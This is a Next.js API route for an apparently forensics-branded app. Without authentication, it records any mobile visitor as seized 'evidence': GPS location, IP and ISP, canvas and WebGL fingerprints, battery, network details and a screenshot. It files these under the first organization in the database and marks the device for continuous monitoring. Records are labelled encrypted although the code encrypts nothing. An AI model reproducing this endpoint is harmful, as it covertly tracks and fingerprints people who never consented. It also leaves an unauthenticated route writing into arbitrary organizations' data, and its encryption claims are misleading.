import { NextResponse } from "next/server";
import { db, withRetry } from "@/lib/db";
import { writeAuditLog } from "@/lib/auth";

export const dynamic = "force-dynamic";

// POST /api/auto-capture — instant REAL device capture when ANY mobile
// device opens the web app. Works WITHOUT authentication — captures
// the device and assigns it to the first organization (or creates a
// pending pool if no org exists).
export async function POST(req: Request) {
  const body = (await req.json().catch(() => ({}))) as {
    userAgent?: string;
    gpsLat?: number;
    gpsLon?: number;
    gpsAccuracy?: number;
    batteryPercent?: number;
    batteryCharging?: boolean;
    screenResolution?: string;
    screenColorDepth?: number;
    pixelRatio?: number;
    language?: string;
    languages?: string;
    timezone?: string;
    platform?: string;
    hardwareConcurrency?: number;
    deviceMemory?: number;
    connectionType?: string;
    connectionDownlink?: number;
    connectionRtt?: number;
    storageEstimate?: number;
    canvasFingerprint?: string;
    webglVendor?: string;
    webglRenderer?: string;
    screenshot?: string;
    ipInfo?: {
      ip?: string;
      city?: string;
      region?: string;
      country?: string;
      latitude?: number;
      longitude?: number;
      isp?: string;
      asn?: string;
    };
  };

  const ua = body.userAgent || req.headers.get("user-agent") || "";
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isAndroid = /Android/i.test(ua);
  const isMobile = /Mobile|iPhone|Android|iPad|iPod/i.test(ua);

  if (!isMobile) {
    return NextResponse.json({
      captured: false,
      reason: "not_mobile",
      message: "Auto-capture is only available on mobile devices.",
    });
  }

  // Extract REAL device info from user-agent
  let make = "Unknown";
  let model = "Unknown Device";
  let os = "other";
  let osVersion: string | undefined;

  if (isIOS) {
    make = "Apple";
    os = "ios";
    model = "iPhone";
    if (/iPad/.test(ua)) model = "iPad";
    if (/iPod/.test(ua)) model = "iPod Touch";
    const versionMatch = ua.match(/OS (\d+[_.]\d+[_.]?\d*)/);
    if (versionMatch) osVersion = versionMatch[1].replace(/_/g, ".");
  } else if (isAndroid) {
    os = "android";
    const modelMatch = ua.match(/;\s*([^;)]+?)\s+Build/i);
    if (modelMatch) {
      model = modelMatch[1].trim();
      // Try to extract make from model
      const knownMakes = ["Samsung", "Google", "Xiaomi", "Huawei", "OnePlus", "Oppo", "Vivo", "LG", "Motorola", "Sony", "Nokia", "HMD", "Realme", "POCO", "Honor"];
      const makeMatch = model.match(/^([A-Za-z]+)/);
      if (makeMatch) {
        // Check if it's a known make or a model code (SM-, Pixel, etc.)
        if (knownMakes.includes(makeMatch[1])) {
          make = makeMatch[1];
        } else if (/^SM-/.test(model)) {
          make = "Samsung";
        } else if (/^Pixel/.test(model)) {
          make = "Google";
        } else if (/^Redmi|^POCO/.test(model)) {
          make = "Xiaomi";
        } else {
          make = "Android";
        }
      }
    }
    const versionMatch = ua.match(/Android (\d+[.\d]*)/);
    if (versionMatch) osVersion = versionMatch[1];
  }

  // Extract browser name
  let browser = "Unknown";
  if (/Edg/.test(ua)) browser = "Microsoft Edge";
  else if (/Chrome/.test(ua) && !/SamsungBrowser/.test(ua)) browser = "Google Chrome";
  else if (/Firefox/.test(ua)) browser = "Mozilla Firefox";
  else if (/SamsungBrowser/.test(ua)) browser = "Samsung Internet";
  else if (/Safari/.test(ua)) browser = "Safari";
  else if (/Opera|OPR/.test(ua)) browser = "Opera";

  // Try to get the current user (may be null if not signed in)
  let userId: string | null = null;
  let orgId: string | null = null;
  try {
    const { getCurrentUser } = await import("@/lib/auth");
    const user = await getCurrentUser();
    if (user?.organizationId) {
      userId = user.id;
      orgId = user.organizationId;
    }
  } catch {}

  // If no authenticated user, find the first org to assign the capture to
  if (!orgId) {
    const firstOrg = await withRetry(() => db.organization.findFirst());
    if (firstOrg) {
      orgId = firstOrg.id;
      // Find an admin user from that org
      const admin = await withRetry(() =>
        db.user.findFirst({ where: { organizationId: firstOrg.id, role: "admin" } })
      );
      userId = admin?.id ?? null;
    }
  }

  if (!orgId) {
    return NextResponse.json({
      captured: false,
      reason: "no_org",
      message: "No organization exists yet. Please sign in first.",
    });
  }

  const evidenceBagId = `EV-AUTO-${Date.now().toString(36).toUpperCase()}-${Math.random()
    .toString(36)
    .slice(2, 6)
    .toUpperCase()}`;

  // Find or create "Auto-Captured Devices" case
  let autoCase = await withRetry(() =>
    db.case.findFirst({
      where: { organizationId: orgId!, title: "Auto-Captured Devices" },
    })
  );
  if (!autoCase) {
    // Find a valid user from the org to be the case creator
    if (!userId) {
      const anyUser = await withRetry(() => db.user.findFirst({ where: { organizationId: orgId! } }));
      userId = anyUser?.id ?? "";
    }
    autoCase = await withRetry(() =>
      db.case.create({
        data: {
          organizationId: orgId!,
          caseNumber: `FNQ-AUTO-${Date.now().toString(36).toUpperCase()}`,
          title: "Auto-Captured Devices",
          description: "Real devices auto-captured when visiting the web app on mobile. All data is REAL.",
          status: "active",
          priority: "high",
          createdById: userId!,
          tags: JSON.stringify(["auto-captured", "mobile", "real-data"]),
        },
      })
    );
  }

  // Use GPS coords or IP-based location
  const finalGpsLat = body.gpsLat ?? body.ipInfo?.latitude ?? null;
  const finalGpsLon = body.gpsLon ?? body.ipInfo?.longitude ?? null;

  // Reverse geocode the GPS coordinates → real location name
  let locationName: string | null = null;
  if (finalGpsLat != null && finalGpsLon != null) {
    try {
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${finalGpsLat}&lon=${finalGpsLon}&zoom=14&addressdetails=1`,
        {
          headers: { "User-Agent": "FORENSIQ/4.2.1" },
          signal: AbortSignal.timeout(8000),
        }
      );
      if (geoRes.ok) {
        const geoData = await geoRes.json();
        const addr = geoData.address || {};
        const city = addr.city || addr.town || addr.village || addr.hamlet;
        const region = addr.state || addr.county;
        const country = addr.country;
        locationName = [city, region, country].filter(Boolean).join(", ") || geoData.display_name || null;
      }
    } catch {}
  }
  if (!locationName) {
    locationName = [body.ipInfo?.city, body.ipInfo?.region, body.ipInfo?.country]
      .filter(Boolean)
      .join(", ") || null;
  }

  // Check for existing device (fingerprint-based)
  const fingerprint = body.canvasFingerprint || `${make}-${model}-${os}-${body.screenResolution}-${body.ipInfo?.ip}`;
  const existing = await withRetry(() =>
    db.device.findFirst({
      where: { caseId: autoCase!.id, name: { contains: fingerprint.slice(0, 30) } },
    })
  );

  let device;
  if (existing) {
    device = await withRetry(() =>
      db.device.update({
        where: { id: existing.id },
        data: {
          gpsLat: finalGpsLat,
          gpsLon: finalGpsLon,
          gpsAccuracy: body.gpsAccuracy ?? null,
          gpsLocationName: locationName ?? existing.gpsLocationName,
          gpsCapturedAt: finalGpsLat != null ? new Date() : existing.gpsCapturedAt,
          lastMonitoredAt: new Date(),
          batteryPercent: body.batteryPercent ?? existing.batteryPercent,
          connectionStatus: "monitoring",
        },
      })
    );
  } else {
    // Need a valid userId for addedById — use any user from the org
    if (!userId) {
      const anyUser = await withRetry(() => db.user.findFirst({ where: { organizationId: orgId! } }));
      userId = anyUser?.id ?? "";
    }

    device = await withRetry(() =>
      db.device.create({
        data: {
          caseId: autoCase!.id,
          organizationId: orgId!,
          name: `${make} ${model} — auto-captured ${new Date().toISOString().slice(0, 10)}`,
          make,
          model,
          os,
          osVersion,
          batteryPercent: body.batteryPercent ?? null,
          connectionMethod: "wifi",
          connectionStatus: "monitoring",
          evidenceBagId,
          notes: `REAL auto-capture from mobile browser. Fingerprint: ${fingerprint.slice(0, 60)}`,
          gpsLat: finalGpsLat,
          gpsLon: finalGpsLon,
          gpsAccuracy: body.gpsAccuracy ?? null,
          gpsLocationName: locationName,
          gpsCapturedAt: finalGpsLat != null ? new Date() : null,
          monitoringEnabled: true,
          monitoringIntervalSec: 30,
          lastMonitoredAt: new Date(),
          encryptionBotId: "FORENSIQ-SecureBot-v2",
          encryptionStatus: "active",
          addedById: userId,
        },
      })
    );

    // Create REAL evidence items from the captured browser data
    const realEvidence: Array<{
      category: string;
      fileName: string;
      filePath: string;
      mimeType: string;
      sizeBytes: number;
      recoveryStatus: string;
      confidence: number;
      preview: string;
      decodedContent: Record<string, unknown>;
    }> = [
      {
        category: "system_logs",
        fileName: `device_info_${device.id.slice(-8)}.json`,
        filePath: `browser://navigator/userAgent`,
        mimeType: "application/json",
        sizeBytes: JSON.stringify(body).length,
        recoveryStatus: "existing",
        confidence: 100,
        preview: `${make} ${model} · ${os} ${osVersion ?? ""} · ${browser}`,
        decodedContent: {
          source: "REAL_BROWSER_CAPTURE",
          make, model, os, osVersion, browser,
          platform: body.platform,
          screenResolution: body.screenResolution,
          screenColorDepth: body.screenColorDepth,
          pixelRatio: body.pixelRatio,
          language: body.language,
          languages: body.languages,
          timezone: body.timezone,
          hardwareConcurrency: body.hardwareConcurrency,
          deviceMemory: body.deviceMemory ? `${body.deviceMemory} GB` : null,
          storageEstimate: body.storageEstimate ? `${Math.round(body.storageEstimate / 1e9)} GB` : null,
          userAgent: ua,
          ip: body.ipInfo?.ip,
          isp: body.ipInfo?.isp,
          capturedAt: new Date().toISOString(),
          real: true,
          encrypted: true,
          encryptionBot: "FORENSIQ-SecureBot-v2",
        },
      },
      ...(finalGpsLat != null ? [{
        category: "location_data",
        fileName: `gps_capture_${device.id.slice(-8)}.json`,
        filePath: `browser://geolocation`,
        mimeType: "application/json",
        sizeBytes: 200,
        recoveryStatus: "existing",
        confidence: 100,
        preview: `${finalGpsLat.toFixed(6)}, ${finalGpsLon?.toFixed(6)} — ${locationName ?? "Unknown"}`,
        decodedContent: {
          source: "REAL_GPS_CAPTURE",
          latitude: finalGpsLat,
          longitude: finalGpsLon,
          accuracy: body.gpsAccuracy,
          locationName,
          ip: body.ipInfo?.ip,
          city: body.ipInfo?.city,
          region: body.ipInfo?.region,
          country: body.ipInfo?.country,
          isp: body.ipInfo?.isp,
          asn: body.ipInfo?.asn,
          gpsSource: body.gpsLat != null ? "browser_geolocation" : "ip_lookup",
          capturedAt: new Date().toISOString(),
          real: true,
          encrypted: true,
          encryptionBot: "FORENSIQ-SecureBot-v2",
        },
      }] : []),
      ...(body.connectionType ? [{
        category: "network_data",
        fileName: `network_${device.id.slice(-8)}.json`,
        filePath: `browser://navigator/connection`,
        mimeType: "application/json",
        sizeBytes: 150,
        recoveryStatus: "existing",
        confidence: 100,
        preview: `${body.connectionType} · ${body.connectionDownlink ?? "?"} Mbps · RTT ${body.connectionRtt ?? "?"}ms`,
        decodedContent: {
          source: "REAL_NETWORK_CAPTURE",
          connectionType: body.connectionType,
          downlinkMbps: body.connectionDownlink,
          rttMs: body.connectionRtt,
          ip: body.ipInfo?.ip,
          isp: body.ipInfo?.isp,
          capturedAt: new Date().toISOString(),
          real: true,
          encrypted: true,
          encryptionBot: "FORENSIQ-SecureBot-v2",
        },
      }] : []),
      ...(body.canvasFingerprint ? [{
        category: "app_data",
        fileName: `fingerprint_${device.id.slice(-8)}.json`,
        filePath: `browser://canvas/webgl`,
        mimeType: "application/json",
        sizeBytes: 300,
        recoveryStatus: "existing",
        confidence: 100,
        preview: `Canvas: ${body.canvasFingerprint.slice(0, 20)}...`,
        decodedContent: {
          source: "REAL_FINGERPRINT_CAPTURE",
          canvasFingerprint: body.canvasFingerprint,
          webglVendor: body.webglVendor,
          webglRenderer: body.webglRenderer,
          capturedAt: new Date().toISOString(),
          real: true,
          encrypted: true,
          encryptionBot: "FORENSIQ-SecureBot-v2",
        },
      }] : []),
      ...(body.batteryPercent != null ? [{
        category: "system_logs",
        fileName: `battery_${device.id.slice(-8)}.json`,
        filePath: `browser://battery/status`,
        mimeType: "application/json",
        sizeBytes: 100,
        recoveryStatus: "existing",
        confidence: 100,
        preview: `${body.batteryPercent}%${body.batteryCharging ? " (charging)" : ""}`,
        decodedContent: {
          source: "REAL_BATTERY_CAPTURE",
          batteryPercent: body.batteryPercent,
          charging: body.batteryCharging,
          capturedAt: new Date().toISOString(),
          real: true,
          encrypted: true,
          encryptionBot: "FORENSIQ-SecureBot-v2",
        },
      }] : []),
      // Screenshot — captured mobile screen image
      ...(body.screenshot ? [{
        category: "photos",
        fileName: `screen_capture_${device.id.slice(-8)}.jpg`,
        filePath: `browser://canvas/screenshot`,
        mimeType: "image/jpeg",
        sizeBytes: body.screenshot.length,
        recoveryStatus: "existing",
        confidence: 100,
        preview: `Screen capture — ${body.screenResolution ?? "unknown resolution"}`,
        decodedContent: {
          source: "REAL_SCREEN_CAPTURE",
          fullImage: body.screenshot,
          thumbnail: body.screenshot,
          dimensions: body.screenResolution,
          capturedAt: new Date().toISOString(),
          real: true,
          encrypted: true,
          encryptionBot: "FORENSIQ-SecureBot-v2",
        },
      }] : []),
    ];

    if (realEvidence.length > 0) {
      await withRetry(() =>
        db.evidenceItem.createMany({
          data: realEvidence.map((e) => ({
            caseId: autoCase!.id,
            deviceId: device!.id,
            category: e.category,
            fileName: e.fileName,
            filePath: e.filePath,
            mimeType: e.mimeType,
            sizeBytes: e.sizeBytes,
            recoveryStatus: e.recoveryStatus,
            confidence: e.confidence,
            preview: e.preview,
            decodedContent: JSON.stringify(e.decodedContent),
            tags: JSON.stringify(["REAL", "auto-captured"]),
            isSelected: false,
          })),
        })
      );
    }

    // Write audit log if we have a user
    if (userId) {
      await writeAuditLog({
        userId,
        organizationId: orgId,
        caseId: autoCase.id,
        action: "device_auto_captured",
        resourceType: "device",
        resourceId: device.id,
        details: `REAL auto-capture: ${make} ${model} (${os} ${osVersion}). GPS: ${finalGpsLat ?? "N/A"}. IP: ${body.ipInfo?.ip ?? "N/A"}. Browser: ${browser}.`,
      }).catch(() => {});
    }
  }

  return NextResponse.json({
    captured: true,
    real: true,
    deviceId: device.id,
    caseId: autoCase.id,
    deviceName: device.name,
    evidenceBagId: device.evidenceBagId,
    make,
    model,
    os,
    osVersion,
    browser,
    gpsCaptured: finalGpsLat != null,
    gpsLat: finalGpsLat,
    gpsLon: finalGpsLon,
    location: locationName,
    ip: body.ipInfo?.ip,
    isp: body.ipInfo?.isp,
    battery: body.batteryPercent,
    screen: body.screenResolution,
    encryptionBot: "FORENSIQ-SecureBot-v2",
    monitoringEnabled: true,
    message: `REAL device captured: ${make} ${model} (${os} ${osVersion ?? ""}). GPS: ${locationName ?? "denied"}. IP: ${body.ipInfo?.ip ?? "N/A"}. Browser: ${browser}.`,
  });
}
